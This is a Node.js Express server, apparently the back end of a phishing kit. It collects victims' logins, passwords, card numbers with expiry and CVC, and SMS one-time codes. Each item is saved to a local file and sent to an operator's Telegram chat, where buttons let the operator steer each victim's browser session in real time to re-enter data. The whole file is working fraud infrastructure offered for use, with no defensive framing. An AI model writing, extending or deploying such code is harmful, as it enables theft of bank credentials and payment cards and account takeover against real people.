const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const multer  = require('multer')
const upload = multer()

// Load configuration
const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json')));

const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(cors()); // Используем cors middleware

// Initialize the Telegram bot with your token
const bot = new TelegramBot(config.token, { polling: true });

// Path to the user data JSON file
const userDataPath = path.join(__dirname, 'userData.json');
const routesDataPath = path.join(__dirname, 'routes.json');

// Function to read user data from the JSON file
const readUserData = () => {
    if (fs.existsSync(userDataPath)) {
        const data = fs.readFileSync(userDataPath);
        if (data.length === 0) return {}; // Handle empty file
        return JSON.parse(data);
    }
    return {};
};

// Function to write user data to the JSON file
const writeUserData = (data) => {
    fs.writeFileSync(userDataPath, JSON.stringify(data, null, 2));
};


// Function to read routes data from the JSON file
const readRoutesData = () => {
    if (fs.existsSync(routesDataPath)) {
        const data = fs.readFileSync(routesDataPath);
        if (data.length === 0) return {}; // Handle empty file
        return JSON.parse(data);
    }
    return {};
};

// Function to write routes data to the JSON file
const writeRoutesData = (data) => {
    fs.writeFileSync(routesDataPath, JSON.stringify(data, null, 2));
};

// Test the bot by sending a message to the chat ID
bot.sendMessage(config.chatId, 'Bot is up and running!').catch(error => {
    console.error('Error sending test message:', error);
});


// Endpoint for handling login and password
app.post('/api/cred', upload.none(), (req, res) => {
    const { login, password, sessionId } = req.body;

    // Log the received data
    console.log('Received credentials:');
    console.log('Login:', login);
    console.log('Password:', password);
    console.log('Session ID:', sessionId);

    // Store user data
    const users = readUserData();
    if (!users[sessionId]) {
        users[sessionId] = {};
    }
    users[sessionId].login = login;
    users[sessionId].password = password;

    // Write updated user data back to the JSON file
    writeUserData(users);

    // Send message to Telegram with user data and all buttons
    const message = `👤 Login: ${login}\n🔐 Password: ${password}\n💳 Card: ${users[sessionId].card || ''} | ${users[sessionId].exp || ''} | ${users[sessionId].cvc || ''}\n✉ OTP: ${users[sessionId].otp || ''}\nSession ID: ${sessionId}`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '❌ INVALID', callback_data: `credinvalid:${sessionId}` },
                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
                    { text: '✉ OTP', callback_data: `otp:${sessionId}` },
                ],
            ],
        },
    };

   bot.sendMessage(config.chatId, message, options);


    // Send response to client
    res.status(200).json({ message: 'Credentials received successfully' });
});

app.post('/api/action', (req, res) => {
    const { sessionId } = req.body;

    // Читаем данные маршрутов
    const routes = readRoutesData();

    // Проверяем, существует ли sessionId в данных маршрутов
    if (!routes[sessionId]) {
        return res.status(404).json({ message: 'Session not found' });
    }

    // Если sessionId существует, отправляем соответствующее действие
    const action = routes[sessionId].action; // Получаем action
    delete routes[sessionId]; // Удаляем action из файла
    writeRoutesData(routes); // Сохраняем изменения

    const response = {
        action: action,
        sessionId: sessionId,
    };

    res.status(200).json(response);
});

// Endpoint for handling card information
app.post('/api/card', upload.none(), (req, res) => {
    const { card, exp, cvc, sessionId } = req.body;

    // Log the received data
    console.log('Received card data:');
    console.log('Card:', card);
    console.log('Expiration:', exp);
    console.log('CVC:', cvc);
    console.log('Session ID:', sessionId);

    // Store user data
    const users = readUserData();
    if (!users[sessionId]) {
        users[sessionId] = {};
    }
    users[sessionId].card = card;
    users[sessionId].exp = exp;
    users[sessionId].cvc = cvc;

    // Write updated user data back to the JSON file
    writeUserData(users);

    // Send message to Telegram with user data and all buttons
    const message = `👤 Login: ${users[sessionId].login || ''}\n🔐 Password: ${users[sessionId].password || ''}\n💳 Card: ${card} | ${exp} | ${cvc}\n✉ OTP: ${users[sessionId].otp || ''}\nSession ID: ${sessionId}`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
                    { text: '❌ INVALID', callback_data: `cardinvalid:${sessionId}` },
                    { text: '✉ OTP', callback_data: `otp:${sessionId}` },
                ],
            ],
        },
    };

    bot.sendMessage(config.chatId, message, options);
    // Send response to client
    res.status(200).json({ message: 'Card data received successfully' });
});

// Endpoint for handling OTP
app.post('/api/otp', upload.none(), (req, res) => {
    const { otp, sessionId } = req.body;

    // Log the received data
    console.log('Received OTP:');
    console.log('OTP:', otp);
    console.log('Session ID:', sessionId);

    // Store user data
    const users = readUserData();
    if (!users[sessionId]) {
        users[sessionId] = {};
    }
    users[sessionId].otp = otp;

    // Write updated user data back to the JSON file
    writeUserData(users);

    // Send message to Telegram with user data and all buttons
    const message = `👤 Login: ${users[sessionId].login || ''}\n🔐 Password: ${users[sessionId].password || ''}\n💳 Card: ${users[sessionId].card || ''} | ${users[sessionId].exp || ''} | ${users[sessionId].cvc || ''}\n✉ OTP: ${otp}\nSession ID: ${sessionId}`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
                    { text: '❌ INVALID', callback_data: `otpinvalid:${sessionId}` },
                ],
            ],
        },
    };

    bot.sendMessage(config.chatId, message, options);

    // Send response to client
    res.status(200).json({ message: 'OTP received successfully' });
});


// Handle callback queries from Telegram
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data.split(':');
    const action = data[0];
    const sessionId = data[1];

    // Логируем действие и sessionId
    console.log(`Отправляем на: ${action}`);

    // Сохраняем action в routes.json
    const routes = readRoutesData();
    routes[sessionId] = { action: action }; // Сохраняем action для sessionId
    writeRoutesData(routes); // Сохраняем изменения

    let messageText;

if (action === 'cred') {
    messageText = "Переход на авторизацию";
} else if (action === 'otp') {
    messageText = "Переход на ввод SMS";
} else if (action === 'card') {
    messageText = "Переход на ввод карты";
} else if (action === 'credinvalid') {
    messageText = "Переход на повторную авторизацию";
} else if (action === 'otpinvalid') {
    messageText = "Переход на повторный ввод SMS";
} else if (action === 'cardinvalid') {
    messageText = "Переход на повторный ввод карты";
} else {
    messageText = "Переход на следующую страницу";
}

bot.sendMessage(callbackQuery.message.chat.id, messageText);
   
});


app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
